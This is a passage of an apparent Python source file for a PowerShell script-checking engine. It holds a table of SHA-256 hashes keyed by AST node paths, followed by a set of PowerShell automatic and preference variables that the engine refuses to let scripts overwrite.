    "0.1.131.0.12.1.0": "88b72ac49c33183f7b20cca4f557335ba08ece2b67483a123813fbe740f17285",  # AssignmentStatementAst
    "0.1.131.0.13": "d04e101a489502e2cb255fe1f6eaa4d125e0c8af28ec433d05626bb047811387",  # PipelineAst
    "0.1.131.0.13.0.3.0.0.0": "795ac2d9a41e2be1c02a07c454b66cf2a34a36df67afe63cc05890c935e2b16d",  # PipelineAst
    "0.1.131.0.14": "64b5767861475a0f6d8869cac5572497651b06f02f2292667e6349434aaeeda7",  # PipelineAst
    "0.1.131.0.14.0.3.0.0.0": "56281ff934f987b37021234845f7bbbd59f779f910f6fbabb8def4ed3c2f2a0c",  # PipelineAst
    "0.1.131.1.0.0": "87de30c6032ce7c946c6263c012fc92c94826045c59f6205da18543a419ffc67",  # PipelineAst
    "0.1.131.1.0.0.0.1.0.0.0": "18a1f58fbb4cf7c5582b8e22a8fafe39f58dd762df4bbed2eac5878a806c5c3d",  # PipelineAst
    "0.1.132": "0f8ef3af1301a81463331e5884cf47104881ebea5d52e10489cc64195eebd812",  # AssignmentStatementAst
    "0.1.133": "761d07ff0ec50e27f92268129bac0fa23b4cc8f6e051761d8c106c50754989f6",  # IfStatementAst
    "0.1.133.1.0": "276d16caa3cce7d65bf176ced60de4b871024134d1ad53ec4ac59d0ba884a604",  # AssignmentStatementAst
    "0.1.134": "f84fbf7e7b3f6941cb733e01d9825d664f1ac70a098ec715202ed1d16d930ead",  # IfStatementAst
    "0.1.134.1.0": "99850a555d1f243f61fb653d779d4a7a2f10d14866eeaa26686056c5ebf37637",  # AssignmentStatementAst
    "0.1.135": "9273ab2c926764241d388c861d81f887bcc5ec8453d4001bfdd609dd2e4b531e",  # IfStatementAst
    "0.1.135.1.0": "9e92804edaf05a899126f324427738e395d6be764dee19be40e5bccdc1696304",  # AssignmentStatementAst
    "0.1.135.1.0.1.0.0.0.0": "f644754ffc3034c9c5096a2bfe5371632cdc308eccabee692170f645ed992ff3",  # PipelineAst
    "0.1.136": "b04f67529d32edf098a57158371bedfee3ea137f506ee1da0d703380d55acee1",  # IfStatementAst
    "0.1.136.1.0": "3c2827b6dd00585f7e6871e52089e93e9f14d46a5c747032f719438dc8c937c2",  # AssignmentStatementAst
    "0.1.136.1.0.1.0.0.0.0": "552a570c3dbfb5a81556e846c3046626705aacce72bf065632550990c684fc25",  # PipelineAst
    "0.1.137": "cd9a7bec0e317fb3ec3875052e071237bfb2e0f7c99c05fe6808f924f99d696f",  # AssignmentStatementAst
    "0.1.138": "a50a226d026dc3fa4508908c6f10ae1873402c9e33b3a4f7d7ad727fc6e187e1",  # AssignmentStatementAst
    "0.1.139": "18c92246193bfed6797f512a993fc9d06ae08ddf8f2aff1725f15428dd35eb43",  # TryStatementAst
    "0.1.139.0.0": "b30e21bf7718efadd22fc11e94f0f5650fcdff851704c4ec528a3ad6701bc6cf",  # PipelineAst
    "0.1.139.0.1": "e9fd1e1960c898217cba269b415b80c0e44bef99440d6b6daf4281f7b76248f6",  # AssignmentStatementAst
    "0.1.140": "d3bb98838eee3751a774233b49503ef37f761448ccd884965bb86c120a0f4048",  # IfStatementAst
    "0.1.140.1.0": "dbf2fa74cf97ce72802eea899c0f931170cb8317179e3fc25a65c981ded18bd0",  # AssignmentStatementAst
    "0.1.140.1.1": "1edb8a6f14eacb02949670af25d857c89d3adf28e0c19a4020fdea48c26eef78",  # AssignmentStatementAst
    "0.1.140.1.2": "fa098261dd97a2f08abd40d5de54a0686afa2d78ebac7bca7a79a2a984714230",  # AssignmentStatementAst
    "0.1.140.1.3": "7c95d13d40f54226dff3eff8c12c573838b130f1b96c830e8b73825993748cf4",  # TryStatementAst
    "0.1.140.1.3.0.0": "86aecad52b578ee32a98d53cae627b28d514b1e1578a99f3497667657a8b1bd8",  # ForEachStatementAst
    "0.1.140.1.3.0.0.2.0": "cb5d77cc26a9183355eed8af03680bb6f0f7d962a2110072cdc9eec6b388ef7f",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.1": "0b9631dc12d669dd016abe4854ba1d9ec3e9f3e196345b5a363b21eb45c03f9b",  # ForEachStatementAst
    "0.1.140.1.3.0.0.2.1.2.0": "adaa481f0127d3aaa5d2532996b4830a20108423f5e9a184d7ec9449c4d35a2c",  # IfStatementAst
    "0.1.140.1.3.0.0.2.1.2.0.1.0": "7e380b9520b43899586052297705dc988f3716c487dd15357f898e85a9aef0f2",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2": "bd2ef788900cbbeb399379a8e527c73bd52e0aa6faea45cbd6e89c3d2addf437",  # ForEachStatementAst
    "0.1.140.1.3.0.0.2.2.2.0": "0318a8964a76fb9d111ba39963053c6bbd21a9e1ad653cdad47dda366bb83618",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.1": "5e16f52f542d7a7393bdcbd727129a1c383404fb389be469474eddfeb9ec1825",  # IfStatementAst
    "0.1.140.1.3.0.0.2.2.2.1.1.0": "0adf571c434ac182d96a489666e1ecdafcbb33879624d976443c413719bbbc76",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.1.1.0.1.0.0.0.0": "efc13130c0a5a8a8df526601a9d9c9c8c7d988b3f58cbd887fa491f3986b08ab",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.1.1.1": "463a73e50dbe6f5a865d6f5a6edc8355a07db65d1b37e44c6ed2ae2bc3145c5c",  # ContinueStatementAst
    "0.1.140.1.3.0.0.2.2.2.2": "f46dd09e13dcd52d2662e4d10c94b44a067f260c0f5c33737a12340e51635722",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.3": "838940929d37a3e37290cc9e2d015007cd846af339dfcefed0df2f23d1882c87",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.4": "a4de8e268f2da5cc810f48680288a5b600cd732d2dca2fe002a2349c81c6095f",  # IfStatementAst
    "0.1.140.1.3.0.0.2.2.2.4.1.0": "f618a98bfb0818a06dffb09cd4308a6470ca086c2693a5e5389745abd455c8e3",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.4.1.0.1.0.0.0": "7e9d77318642ae78d7511ad6c46ef755264b402c800ac99741227dd514258edc",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.5": "595ee1470e2e2cca6c02d59a88b42055dff8d754ba76e6177ee5dbdd3f8e8c3d",  # IfStatementAst
    "0.1.140.1.3.0.0.2.2.2.5.1.0": "dded1db4c555fda6148ef40ef3486d584c2590c1d5b9b72073a1f98c24c76924",  # ContinueStatementAst
    "0.1.140.1.3.0.0.2.2.2.6": "c3fe64574b42a542cf31f201585c6adb5740b70b3a36c60c20c84a75ae858644",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.6.1.0.0.0.0.0": "0f62568b57ea95a97218bcef1ca7523235deb68ee05e09e70e1a2bfe6c31aaae",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.7": "2a6fdc78ac750949d7ee696c35820db17ba14212a3b442fb2ec85b0d4ba1c1a1",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.8": "5bbc3ff1f055bfeb89cae50a1a7690f3d3dc51f6da7be824652747b767ff6b17",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.8.1.0.1.0.0.0": "f53eddef64a5ada1f0f9de75dcc31b9781de549ee186034195d2650655a7d0bd",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.9": "87c6fa0b4134cfbf8a88ab09e13bd9d74188065137402dd3ba49005bcf53f575",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.9.1.0.1.0.0.0": "45cfcacd0658c66b303d4f91ff2a2dc559fe1c0779a0fb9184e8be4984945db0",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.10": "ef7e373ab76ec26fa5c1ce305c205c71bddf2ef9f66ad2ab3acaabcfc0c96ba6",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.10.1.0.1.0.0.0": "0d70e1c5c0d1c03f70f33be860eeea816c561af8d6d9f31a800a8e1888cd0bb4",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.11": "66a7a752ee29d77f2e44246bf7b501d12d8daabb2bbf9150b8e25c2a34f26e2d",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.11.1.0.1.0.0.0": "c28ac0244fe2564d080b3f690c92fc86b5f990bac55e665a30e70af2ebb8ad22",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.12": "ca374bfc6d0ac812a72df1776287756bda83a98bf15d80c7fcc6d7d9dd62af34",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.13": "7182f601820fcae2b4e69e0027b99be2e9417582197b02f3b710ce30a016e4b8",  # IfStatementAst
    "0.1.140.1.3.0.0.2.2.2.13.1.0": "25073369bc5c96a363170e985ebd1f713eb66124c287ecaac72388ff5db03901",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.13.1.1": "000162c7db2b688a97050fd4e771dacc671e41ea48225e3b23c2ae12ce9427e4",  # ForEachStatementAst
    "0.1.140.1.3.0.0.2.2.2.13.1.1.1.0.0.0.0": "1a3ef70fc1f5f166ef737e70e9bfac9b5031a8a01a3bed363956d1c2c623f016",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.13.1.1.2.0": "27b045c96bf71830e70bfe47d8ca72946eac3251b75c7e5f1cc5b7f390b6b5ca",  # IfStatementAst
    "0.1.140.1.3.0.0.2.2.2.13.1.1.2.0.1.0": "db5b6131175e1743bc1fddf09bb2ff813188154c66b62b3d31a69e68d6cc8bee",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.14": "dcb1e27d86cf0e20063c4c00b1bc2935357a940cd11ae1e2b5e32f81360be484",  # AssignmentStatementAst
    "0.1.140.1.3.0.0.2.2.2.14.1.0.1.9.1.0": "1063d7cc7829480f41bb259d5f9b411a40b6b4187fb6f716e8c161fc19a20f38",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.14.1.0.1.9.2.0": "fe3a8ac3bb9465add324896b0443a300f5e28720d8970ea3084622b0f331475e",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.14.1.0.1.11.1.0": "036df3266821b9c5a1934890a53b9fd193606949cd072e99e2bcb8da91bb2322",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.14.1.0.1.11.2.0": "54023aaa4ce8844673e682a9de5b36293429e668aa57f648ff0bf26ae3ea6898",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.14.1.0.1.15.1.0": "a699d79da02c30fd3378433b49e00d807883e13abae7ed393891edd0f9a8f589",  # PipelineAst
    "0.1.140.1.3.0.0.2.2.2.14.1.0.1.15.2.0": "de4203a10efef6d0a6f093005b99b8a0e4ba1514c2cfc9fdb575516f3652524f",  # PipelineAst
    "0.1.140.1.3.1.0.0": "592d0c58a413ab618a421f93e672a2678fb33b8aa73672665a98af93b9e35f0e",  # AssignmentStatementAst
    "0.1.140.1.3.1.0.1": "d443ca86665bb4f3e356c5603970a1654ac3669e6c9de02d50a3eb9457cb9148",  # AssignmentStatementAst
    "0.1.140.1.3.1.0.1.1.0.0.0.0": "72574ac9ebc00adf3acaefbdb1c77d4e62c6f95709e0feab1b1c3f8c0b5971c0",  # PipelineAst
    "0.1.140.1.3.1.0.2": "e8223af9c40f0b12aaf4e6291c4b5879433f828e452a006d4416a1887e13cc8f",  # PipelineAst
    "0.1.140.1.4": "ebaafd0e95fe46272de53f334d1a410d09b30a5ce30dc7361752ac8ec75c6889",  # AssignmentStatementAst
    "0.1.140.1.4.1.0.0.0.0.0.0.0.0": "9aac65acc89313e102e709228eb317af5b95923c6441a8249c354e2ad97cb775",  # PipelineAst
    "0.1.140.1.4.1.0.0.0.1.1.0.0.0": "dd94dc351db5e265ee800f90a189c1d75db53a59cbfe290c22b881755400d8f3",  # PipelineAst
    "0.1.140.1.5": "2856f57a3eb8697d3fefe0f0750f2b0d19240ce1656bb7854499d476e30d0de7",  # AssignmentStatementAst
    "0.1.141": "ce3e9feb77e03e75e39f403310cb94b9e20fb80e95e34198c1c885f10fde46aa",  # AssignmentStatementAst
    "0.1.142": "7ac3e2b92528e1cb2ada61ce612428c1d00c7ea11ccefce824ea55fd51cf8eb3",  # AssignmentStatementAst
    "0.1.143": "c58f99f0f892f05df583a78c3deaed2e843f4ecdf130eea1fd9b35944f3d58e6",  # AssignmentStatementAst
    "0.1.144": "cd9f9154f9ca7de6e98fe0b6398a5daa7a3b93c237d06bd6e025bbc100233b87",  # AssignmentStatementAst
    "0.1.145": "c35856927ad3a2aca655a9a19d63b51513015b93591b508c55b6c3764231994e",  # IfStatementAst
    "0.1.145.1.0": "19c4842869063094d00380fef1443e5c41e01512ad0ba34dc01f21205404213f",  # AssignmentStatementAst
    "0.1.145.1.1": "4ae80695aaa47a61e80757c9ab227d93c9530537b3622b7e530c8a878dc535bb",  # TryStatementAst
    "0.1.145.1.1.0.0": "bddbd4f40deb12ffee41abda78975f1b93952f1839faec2349ac4ccd779d4472",  # AssignmentStatementAst
    "0.1.145.1.1.0.0.1.0.3.0.0": "90deb6eff5d77008b669dfa1e405bed31860bbcba2dc0de9b15b2e4bbef83a0f",  # PipelineAst
    "0.1.145.1.1.0.1": "2de1088a8a30be7e762392c43b578a8f0cbda321e007c5dd1358443f92e00207",  # AssignmentStatementAst
    "0.1.145.1.1.0.2": "30dbf7dca5e2d0e53c020cc08e90c9dc056f5597b868f7b0e6367f81aca8a0b4",  # ForEachStatementAst
    "0.1.145.1.1.0.2.2.0": "24f67e90a959d9b3083fccc0cbb3df610f7b121ba68f2cf55968dad61f8cea56",  # TryStatementAst
    "0.1.145.1.1.0.2.2.0.0.0": "3e2df5682dc53caed0616c165de94bd86a3132631d3cd5fadc0940bec4ee3ff4",  # AssignmentStatementAst
    "0.1.145.1.1.0.2.2.0.0.1": "8086a2b5e2f27db09f1c0024396e797f33f031eab4d667820859d2e2d1a8c663",  # AssignmentStatementAst
    "0.1.145.1.1.0.2.2.0.0.2": "e327a8dce8e6e62874d09d274b3a09a40fe0bbb26a245fdcd73c3e2194707dc0",  # AssignmentStatementAst
    "0.1.145.1.1.0.2.2.0.0.2.1.0.1.1.0.0.1.0.0.0": "e4c2aad6ee8a2cffcadcc230e32c0a92f2c00e34abc097eee2df8f3762690155",  # PipelineAst
    "0.1.145.1.1.0.2.2.0.0.2.1.0.1.3.0.0.0.0.1.0.0": "fc988d9eef336963485150abd11660d2f0336d467ab385d61f31a0a8c84cb268",  # PipelineAst
    "0.1.145.1.1.0.2.2.0.0.2.1.0.1.5.0.0.0.0.0.0.0": "0f57a57115b68053a426d2192cb361ffb40485e4b027514e21acbc5a868dc28e",  # PipelineAst
    "0.1.145.1.1.0.2.2.0.0.2.1.0.1.5.0.0.0.0.0.0.0.1.1.0.0.0": "44ca83bf0eba5170bf31a91cd9da845f1641c802fa20e36e048739eb1d00d5b9",  # PipelineAst
    "0.1.145.1.1.0.2.2.0.1.0.0": "f4efe811aa6d9cf978aeed872939b66a74807687c1aaa5858c3f5a5fc72f44d8",  # AssignmentStatementAst
    "0.1.145.1.1.0.2.2.0.1.0.0.1.0.0.0.0": "a51c37e4a9e392334383573e0feb0ec61276cdddf80ee4144dd8975190019310",  # PipelineAst
    "0.1.145.1.1.0.3": "31fa730cf7192eaa1cd9251e29e28ae4a364d99e0ce5336b3ea7ecac839af728",  # AssignmentStatementAst
    "0.1.145.1.1.0.4": "5d24a9c1484997e21781d73cef1a445ec8aab81810312192766dc47552262767",  # PipelineAst
    "0.1.145.1.1.0.4.0.3.0.0.0": "d16e19c3c4dbe5271deb51cabdce29298a943fbebc5740ffd0ed3fb1a4f924c4",  # PipelineAst
    "0.1.145.1.1.1.0.0": "4bac44f807da5fa84139c814015635efb6784727b790b8a011d0d5b0be1705f3",  # PipelineAst
    "0.1.145.1.1.1.0.0.0.1.0.0.0": "97c75d4decfbdfdd68432dd88df68f84e1680a2d914e236da685cb2169fa6306",  # PipelineAst
    "0.1.145.1.2": "bd5d454057b600e8d487ba792995c28eaaab85183878c13c82dd8e1fc8a33091",  # AssignmentStatementAst
    "0.1.145.1.3": "61a1af0aff68aa137c71f0f99c74b90a5b976bf7498338afc0c8e0088330c78f",  # AssignmentStatementAst
    "0.1.145.1.4": "5fdbb4317e421f16a7cf45e63cf305df9ee3eb60518680208efd771e3fd781eb",  # IfStatementAst
    "0.1.145.1.4.1.0": "cdf4545ba4505d0ce9d344399a89bebb69869849635bfb75920b87d6a8b39ae3",  # AssignmentStatementAst
    "0.1.145.1.5": "4213a345de81c94eace93da9aeb13fbf9f6ede0e1c35e1e4ba98be9f3441069e",  # AssignmentStatementAst
    "0.1.145.1.5.1.0.3.0.0": "da7edf45db93a518c27a83b03fa9f4a31a8d84311f83172a87a98059fa8806f0",  # PipelineAst
    "0.1.145.1.6": "261a346fffdc6f04726a3793d06d1b3219a44695e3d7d35445cdce41493bee7d",  # AssignmentStatementAst
    "0.1.145.1.7": "d822efb6f1cdbebda42ca2eee35de95e71a972a10ffc178e426afe68aae568ef",  # ForEachStatementAst
    "0.1.145.1.7.2.0": "621be5bd787dcb8896c5cb6e98240219cc4fdd72fc143e9610206cca695578ac",  # TryStatementAst
    "0.1.145.1.7.2.0.0.0": "0d84049087105fed872ffcbdbe6b7d077594d28b3b419a2c39a71fb9c29bdebd",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.1": "b562dd5751ac3ab1fbf1e7fa77d60217557a4f97224a104f651ba69aec3ea50e",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.2": "4dda8947ea74922092bc3ccfe0492053440e5ea6be385890cc8e50129c7c0e02",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.2.1.0.1.0.0.0": "64ef7ba4085cf145dae50be0d880d973e47bc1a14f629771ac89d8d7f6fa7cbd",  # PipelineAst
    "0.1.145.1.7.2.0.0.3": "ffae2400436a803c18cfefc1932ddc53c4f0a8ead807efafc53bcc876c14060a",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.3.1.0.1.0.0": "7135c8e979507d66e99376f1c1062c417ad6c7550dfc4a0dc46f8fbfcf960768",  # PipelineAst
    "0.1.145.1.7.2.0.0.4": "8708ddc63614541cece3ee51e2ae6e3864debdd96c70f7fb049806bfabc114f8",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.5": "6f09ae7eec4ca394f73162c6f0cc7a2a80bf65693774be362e3a778bf6f4a8b8",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6": "66d0e5af93b967166d7b309f8ccdaa968a9f343aa26fb2428ec3900c6bf15da2",  # IfStatementAst
    "0.1.145.1.7.2.0.0.6.1.0": "75861ffeea9a4463a3f7da8b086f9d35a54af259ba91dac0e4298adb56b97276",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6.1.0.1.0.1.0.0.0": "0142604bf91761391106c01129049f9f2879624f6bde1e6e520388c815dfaf7a",  # PipelineAst
    "0.1.145.1.7.2.0.0.6.1.1": "9213805bc0005290b2585851112a4ef1c94cbe338ac113a4b74b95295e75c387",  # PipelineAst
    "0.1.145.1.7.2.0.0.6.2.0": "16d2d32611ab5ac25fe0d85b58373601b8b1c3a57428cd1f1a89950f723b5ee4",  # TryStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.0": "fee24ec34b426cc7f11f387b65bb53c75bd741a8e592c5bfde03a1375c4a46c8",  # IfStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.0.1.0": "28cf7b642840ca0c448dd99a9f485fd4dd98748be67ee0f21326eb1ab64b191f",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.0.3.0": "6e5fb8e7b45ba5ce2c7cfff2415bb4fbc91f700b868c0d39e0c1426b22f23fe0",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.0.4.0": "4ab51c40251327651e9e435a29f5a3b0a3a8c497088d7dfc966897cb3e19d193",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.1": "1c8cac0addb39c9e798aecaf6e879d3e50a29ff8ad78f71f2ae3adc3923524db",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.2": "5eb862eff1a41e75d29431a39c19a41d0b33a901af043b6d9b05288154b2e061",  # SwitchStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.2.2.0": "786392ab340ddcc67a5e9d0ce9b37b89ce42d71ec5c37c7b6c9336ccc2cc9316",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.2.4.0": "44f0e90e83d6afc833bb7b2014a4c75ffbd655cd3de03025488486a3f6d54140",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.3": "08a65bd91da9d8a2962d6fa412ac5be41612b3e9457298a1d8a703092e820181",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.4": "f3fde40f3e6177a8c3b0d45a67ec5c7d9cab7d6a4b36975a8bc2890762b18e1c",  # SwitchStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.4.2.0": "20d826594a9e400f93748ce5871a86a88497b79b58ab7a502fd76a3716ac4a03",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.0.4.4.0": "93cdb5661d96a04f337b9b29e177c04888704ae4b5961301412b87da4fe88e98",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.0.6.2.0.1.0.0": "762cc07f8abc39386e2400b4f2fd776c2752c387f18f3b851a8ffd1bfa0010af",  # PipelineAst
    "0.1.145.1.7.2.0.0.6.2.0.1.0.0.0.1.1.0.0": "2b1537900e7c84e0c0e53fd50e4a37007f51295247c48abbb85c9fbba2113a9e",  # PipelineAst
    "0.1.145.1.7.2.0.0.7": "3028b6bfd5ff28c1275ecb7d6a640bc98fa2c056af15e32f45d27a48140987f2",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.1.0.0": "d55e0ff3893360e1accbc990cc185f783a584cf12ca2bb28df6756b154002108",  # AssignmentStatementAst
    "0.1.145.1.7.2.0.1.0.0.1.0.0.0.0": "7eb324b4c05f65fce3a9008ff10bf981317d18ae6abb429f339399db99aaf00e",  # PipelineAst
    "0.1.145.1.8": "6532f9762c7a6c64e1d7f18d135cd55fd6cb80ced2cf00cd77ea5b7eb3199829",  # AssignmentStatementAst
    "0.1.145.1.8.1.0.0.0.0": "d6a7177cffc03e1d065bb8089c2abfa38d70ae30feabf66e779fdb479ca3b3fd",  # PipelineAst
    "0.1.145.1.8.1.0.0.0.0.1.1.0.0.0": "e28353151180eac88213d4823a5c02b82649a7d22160828060d95940ff60ef82",  # PipelineAst
    "0.1.145.1.9": "b9afa6595d44da5518bf6983fd209804cb32c8f456de07aeea0713ac851b9114",  # IfStatementAst
    "0.1.145.1.9.1.0": "ac114d362792f4b2ad9949b2c342f2a83e5e295bdf86e82d8ebb9f89e2e0cac5",  # PipelineAst
    "0.1.145.1.9.1.0.0.1.0.0.0": "4e573c3f94ea25f50a9ea7e2cfea899a7715f9ffc11ccd08b65c98acc06125bf",  # PipelineAst
    "0.1.145.1.9.1.1": "b3a557006f0b1a45b6d6c9d9eaa849ec0335f0f8daccff01441cbbc9205f9e5d",  # AssignmentStatementAst
    "0.1.145.1.9.2.0": "5af2ba2f0cde60a0fae2e3d8ee28cc5f95942933d84ca686a1c3f2adffb93b5f",  # AssignmentStatementAst
    "0.1.145.1.9.2.1": "e36f9e071a252e3c7b3406a33b3c8ae9ad3799cdcfbb013174ee017013c2791e",  # PipelineAst
    "0.1.145.1.9.2.1.0.3.0.0.0": "2fbf177673ea0ffede053fe05107fd47e128c86a6642a4763648e08eeba6511b",  # PipelineAst
    "0.1.146": "ed9139392f98d89b574f922a43b2b52d29e6778d9deac702af586095ece5cd4c",  # AssignmentStatementAst
    "0.1.147": "12c162b47cdcbb3617f8fb8038761ce2e5ceacf22ac688337ef7875e758c9bb1",  # IfStatementAst
    "0.1.147.1.0": "18cc4a6580ed30fc51f9693c099006e7fc7192f47a5d6bf2d648bce20694559f",  # AssignmentStatementAst
    "0.1.148": "44a74d2c687a26cd59290e2f7b4eb27488589fa0254ce343482946459d5accf1",  # IfStatementAst
    "0.1.148.1.0": "10324297214de8286e39ad9aa19045a341621cd251e08ff803ce50197532d0e6",  # AssignmentStatementAst
    "0.1.149": "9fafd60633583f99a5a0653f4ca2f110795b2e291e7499fc602c856794d1a371",  # IfStatementAst
    "0.1.149.1.0": "da8e09054b7fbcee06251201b47370077453834883d80af4f0ba2055149b4990",  # AssignmentStatementAst
    "0.1.150": "752a89500c1abffcb140a5e09194a2fc6f1b5a312752dba7063ff7b071b974a1",  # IfStatementAst
    "0.1.150.1.0": "411f8b5bc9201c5011c7a519ec8e00b76149349fe7c658c666b4a819fbacafb7",  # AssignmentStatementAst
    "0.1.151": "a5ea11bfceca9c4bfb32c8e0e01c79d02c11fbaaa346b240f9b3e4f5478158fe",  # IfStatementAst
    "0.1.151.1.0": "9a0613ba25e65419fbca332170fa6fa693e21aae16eace24152aae44b5272289",  # AssignmentStatementAst
    "0.1.152": "117602c507168f408076ddc11cb4a03ee16f9bd26d9aa1b73970092438f3c308",  # AssignmentStatementAst
    "0.1.152.1.0.1.11.0.0.0.0.0.0.0": "cdf0e738ff16e5f0bd940fa07399f17f1fef583d07eada2c3f8d3550983bd46e",  # PipelineAst
    "0.1.153": "6544f3bda8dc487e4a2e520c7c7776c2f4c562baca25f5a8f2548c599df5112f",  # PipelineAst
    "0.1.153.0.1.0.0": "2ce9cedff728a7358583a42ac8fcb944702e6d0ba3b768d8347e0a4d51c6f9f1",  # PipelineAst
    "0.1.154": "4a4b3f24cfaee41e3e1b8cfa0998614789c79da331884f334e4df44c914bfa1e",  # PipelineAst
    "0.1.154.0.1.0.0": "da0387a5d0b9b8dad19a28f07eca8702f15b121e861a81be5e2c1ce2111d83f8",  # PipelineAst
    "0.1.155": "97c11e16a1cab4dcc87d6694abcc241bff02faeaa07d4ccb50e00076785f7edd",  # PipelineAst
    "0.1.155.0.1.0.0": "8c907dd7208f9c5f8666ed8e75a584ccd5dcca565261b5197ba6f4a8207f3117",  # PipelineAst
    "0.1.156": "c9921cd1a5f773c6a39e0597816ab92c3ad4863254b40c1bf2eb66083bb5e8e9",  # PipelineAst
    "0.1.156.0.1.0.0": "9476d1abf0736ba29d3e0131c182fa4b8bf2c6595d4d78c92684be477bca7caf",  # PipelineAst
    "0.1.157": "5a56f2d54b8cc4a9d79322bbe53b59e6185df2dbe2bf71d460498c2cd79bfe91",  # PipelineAst
    "0.1.157.0.1.0.0": "f77b9cf954f1f28af91bd6808794398862494c9e18163b27c2265b56e701a5e6",  # PipelineAst
    "0.1.158": "9bbc87994267e743f0da7dcbb77613482429cda68d06b8ed9e8255117104607f",  # PipelineAst
    "0.1.158.0.1.0.0": "d8ad4916a1fd05e08359a8a98276d9a2efdeea1f81c478a3bfd235703c9d56c0",  # PipelineAst
    "0.1.159": "a2be4e663f305f60f4eb6d55a587a1bc7e6e37540636627e1a592c68832dfb39",  # PipelineAst
    "0.1.159.0.1.0.0": "113d4023599492f5e61294f53cc5c84c5e9075c407ace5b0531961aa3cebb6f7",  # PipelineAst
    "0.1.160": "663f8b7afdb58321520355836fb9bae2a05b39fec6e3b0bed1cf267782b61c8f",  # PipelineAst
    "0.1.161": "94b4275a2f1313ef47f3219e5ef1588ae826147653d2615ae51b25b4b1169c57",  # PipelineAst
    "0.1.162": "60041980a22b5b6ee3922b3823907727f076b34571440fd182fe8600fe35448b",  # IfStatementAst
    "0.1.162.1.0": "ab3c4c2f9d643e8cf5405692491edc9dccee0c2fe5452f8d97f1a01e898eddb0",  # PipelineAst
    "0.1.162.1.0.0.1.0.0.0.1.1.0.0.0.0": "84cda6ae1577defa714f35bf6bda54b75f7ced36f0556574f72f9f9a3c2700c3",  # PipelineAst
    "0.1.162.1.0.0.1.0.0.0.1.3.0.0.0.0": "c52dd4a56ba0952bb70e7dab8f1854daa01f79b4d991158e07f94a4d9700a86c",  # PipelineAst
    "0.1.163": "ec9e97e053e139ec34f7c26a8dc4e99bed0d07fd76056f27332e2c45297ad0cc",  # PipelineAst
    "0.1.164": "2fae6642d9d85c9ac8e5c722783bdec47a0ee692419dbb05fe3b209cc7de2225",  # PipelineAst
    "0.1.164.0.1.0.0.0.1.9.0.0.0.0.0.0.0.0.0": "1a1117b3da4518309d7a465021a20c0c5c3327e646238a6a705aded89eff1bc4",  # PipelineAst
    "0.1.164.0.1.0.0.0.1.9.0.0.0.0.0.1.1.0.0.0": "423a0f37c39ed4f5ec7f1510c1480a65caaeffcad34321cc792ecb24c2ccf0c9",  # PipelineAst
}

# Automatic and preference variables. The engine reads them, so binding one
# changes how *other* statements behave; a write is refused unless it is in
# SPECIAL_BINDINGS. Any variable named *preference is treated the same way.
_SPECIAL_VARIABLES = frozenset(
    {
        "$",
        "?",
        "^",
        "_",
        "args",
        "consolefilename",
        "enabledexperimentalfeatures",
        "error",
        "errorview",
        "event",
        "eventargs",
        "eventsubscriber",
        "executioncontext",
        "false",
        "foreach",
        "formatenumerationlimit",
        "home",
        "host",
        "input",
        "iscoreclr",
        "islinux",
        "ismacos",
        "iswindows",
        "lastexitcode",
        "logcommandhealthevent",
        "logcommandlifecycleevent",
        "logenginehealthevent",
        "logenginelifecycleevent",
        "logproviderhealthevent",
        "logproviderlifecycleevent",
        "matches",
        "maximumaliascount",
        "maximumdrivecount",
        "maximumerrorcount",
        "maximumfunctioncount",
        "maximumhistorycount",
        "maximumvariablecount",
        "myinvocation",
        "nestedpromptlevel",
        "null",
        "ofs",
        "outputencoding",
        "pid",
        "profile",
        "psboundparameters",
        "pscmdlet",
